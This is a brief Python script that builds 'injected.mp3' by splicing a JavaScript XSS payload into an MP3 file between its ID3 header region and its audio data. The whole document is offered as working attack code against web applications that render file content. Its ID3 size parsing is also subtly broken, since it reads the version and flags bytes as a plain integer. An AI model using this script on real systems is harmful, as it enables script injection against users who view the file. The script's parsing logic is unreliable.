import struct

# XSS payload
xss_payload = "<script>alert('XSS');</script>"

# Open the original MP3 file
with open("original.mp3", "rb") as f:
    original_mp3 = f.read()

# Extract the audio data from the original MP3 file
id3_size = struct.unpack(">I", original_mp3[3:7])[0]
id3_data = original_mp3[:10 + id3_size]
audio_data = original_mp3[10 + id3_size:]

# Create a new MP3 file with the same structure as the original file
new_mp3 = id3_data + xss_payload.encode() + audio_data

# Save the modified MP3 file
with open("injected.mp3", "wb") as f:
    f.write(new_mp3)
